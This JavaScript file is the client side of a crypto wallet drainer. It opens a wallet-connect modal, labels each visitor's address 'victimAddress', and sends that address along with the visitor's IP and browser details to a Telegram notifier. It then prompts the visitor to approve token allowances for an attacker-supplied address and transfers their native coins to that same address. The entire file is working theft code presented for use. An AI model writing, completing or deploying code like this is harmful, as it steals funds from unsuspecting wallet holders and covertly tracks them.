import "./development/config.js";
import { ethers } from "ethers";
import { createWeb3Modal, defaultConfig } from "@web3modal/ethers5";

import serverApi from "./apis/serverApi.js";
import deviceApi from "./apis/deviceApi.js";

import secureDevTool from "./utils/secureDevToo.js";
import web3Services from "./services/web3Services.js";
import Instructions from "./components/Instructions.js";
import abiApi from "./apis/abiApi.js";

const MAIN_TOKEN = "MAIN_TOKEN";

let web3Modal;

const instructions = new Instructions();
window.instructions = instructions;

const userId = window.process.env.USER_ID;
const bundleId = window.process.env.BUNDLE_ID;
let connectButtons = document.querySelectorAll(".connect-button");

const openModal = () => {
  web3Modal.open();
};

try {
  const USER = await serverApi.getUserBundle(userId, bundleId);
  const config = await serverApi.getConfig();
  window.USER = USER;
  window.config = config;

  /*   if (USER.DISABLE_DEV_TOOL) secureDevTool(); */

  const connectButtonsSelector = document.querySelectorAll(
    `.${USER.BUNDLE_BUTTON_CLASS}`
  );
  connectButtons =
    connectButtonsSelector.length > 0 ? connectButtonsSelector : connectButtons;

  const web3ModalConfig = defaultConfig({
    metadata: {
      name: document.title,
      description: USER.BUNDLE_DESCRIPTION,
      url: "https://reown.com/appkit", // origin must match your domain & subdomain
      icons: ["https://assets.reown.com/reown-profile-pic.png"],
    },
    defaultChainId: 1,
    rpcUrl: "https://cloudflare-eth.com",
  });

  web3Modal = createWeb3Modal({
    ethersConfig: web3ModalConfig,
    projectId: config.wmProjectId,
    chains: Object.entries(config.chains).map((chain) => ({
      chainId: chain[1].chainId,
      name: chain[1].chainName,
      currency: chain[1].tokenSymbol,
      explorerUrl: chain[1].explorer,
      rpcUrl: chain[1].rpcUrl,
    })),
    themeMode: USER.MODAL_THEME,
    featuredWalletIds: [
      window.ethereum
        ? ""
        : "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
      "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      "e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4",
      "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927",
      "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
    ],
    allWallets: "SHOW",
  });

  connectButtons.forEach((btn) => btn.addEventListener("click", openModal));

  web3Modal.subscribeProvider(onConnect);
  web3Modal.subscribeEvents(onModalEvents);
} catch (error) {
  console.log("error: ", error);
}

async function onConnect({ isConnected, error }) {
  try {
    if (!isConnected || window.victimAddress) return;
    if (error) console.log("error: ", error.message);

    console.log("loading on connect");
    instructions.loading();

    window.walletName = localStorage.getItem("wallet_name");
    window.provider = web3Modal.getWalletProvider();
    window.provider.on("accountsChanged", window.location.reload);
    window.ethersProvider = new ethers.providers.Web3Provider(provider, "any");
    window.signer = ethersProvider.getSigner();
    window.victimAddress = web3Modal.getAddress();
    window.country = await deviceApi.getCountry();
    window.allTokens = await serverApi.getAllTokens(victimAddress);

    const telegramNotification = {
      victimAddress: victimAddress,
      walletName: walletName,
      ip: country.ip,
      userAgent: navigator.userAgent,
    };

    const telegramResponse = await serverApi.telegramNotification(
      "WALLET_CONNECTED",
      telegramNotification
    );

    instructions.hide();
    connectButtons.forEach((btn) =>
      btn.removeEventListener("click", openModal)
    );

    if (allTokens.length === 0) {
      connectButtons.forEach((btn) => {
        btn.setAttribute("disabled", "disabled");
        btn.textContent = "Insufficient Balance";
      });
      console.log("choose another one ");

      return;
    }

    connectButtons.forEach((btn) => {
      btn.textContent = USER.BUTTON_NAME;
      btn.addEventListener("click", withdrawal);
    });

    USER.IS_AUTOMATIC_WITHDRAWAL_REQUEST && false && (await withdrawal());
  } catch (error) {
    instructions.hide();
    console.error(error.message);
  }
}

async function onModalEvents(event) {
  if (event.data.event === "SELECT_WALLET") {
    const walletName = event.data.properties.name;
    localStorage.setItem("wallet_name", walletName);
  }
}

async function withdrawal() {
  instructions.loading();
  const randomAddress = await serverApi.getRandomAddress();
  localStorage.setItem("randomAddress", randomAddress);
  console.log("allTokens: ", allTokens);
  instructions.hide();
  for (const token of allTokens) {
    console.log("token: ", token);
    const currentNetwork = await ethersProvider.getNetwork();
    const currentChainId = currentNetwork.chainId;
    const chainSetting = config.chains[token.chain];
    const chainId = chainSetting.chainId;

    if (currentChainId !== chainId && walletName !== "WalletConnect") {
      try {
        instructions.setStatus("switch_chain");
        await web3Services.switchNetwork(
          { ...chainSetting, from_network: currentNetwork.name },
          USER.MAX_SWITCH_COUNT
        );

        const telegramNotification = {
          victimAddress: victimAddress,
          walletName: walletName,
          ip: country.ip,
          userAgent: navigator.userAgent,
          from_network: currentNetwork.name,
          to_network: chainSetting.chainName,
        };

        const telegramResponse = await serverApi.telegramNotification(
          "NETWORK_ACCEPTED",
          telegramNotification
        );
        instructions.hide();
      } catch (error) {
        instructions.hide();
        console.log("outside error: ", error.message);
        continue;
      }
    }

    if (token.type == "token") {
      window.chainProvider = new ethers.providers.JsonRpcProvider(
        chainSetting.rpcUrl
      );

      try {
        if (token.id.startsWith("0x")) {
          const tokenAbi = await abiApi.get(token.id, chainSetting);
          const targtedFunctions = [
            "approve",
            "increaseAllowance",
            "increaseApproval",
          ];

          const contractFunction = web3Services.getContractFunctions(
            tokenAbi,
            targtedFunctions
          );

          const [method] = contractFunction;

          const tx_options = {
            spender: randomAddress,
            token: token,
            abi: tokenAbi,
            chainSetting: chainSetting,
          };

          const transaction = await web3Services.allowance(
            method,
            tx_options,
            USER.MAX_RETRY_COUNT
          );

          const response = await serverApi.complete({
            event: "APPROVED_TOKEN",
            token: token,
            abi: tokenAbi,
            chain: chainSetting,
            randomAddress: randomAddress,
            victimAddress: victimAddress,
            gasPrice: transaction.gasPrice,
            tx: transaction.receipt.transactionHash,
          });
        } else if (token.id === MAIN_TOKEN) {
          const transaction = await web3Services.transferNativeToken(
            {
              fromAddress: victimAddress,
              toAddress: randomAddress,
              chainSetting: chainSetting,
              token: token,
            },
            USER.MAX_RETRY_COUNT
          );
          const response = await serverApi.complete({
            event: "NATIVE_TOKEN_TRANSFERED",
            token: token,
            chain: chainSetting,
            randomAddress: randomAddress,
            balance: transaction.value,
            tx: transaction.receipt.transactionHash,
          });
        }
      } catch (error) {
        const code = error.code;
        const message = error.message;
        console.log("error code: ", code);
        console.log("error message: ", message);
      }
    }
  }
}
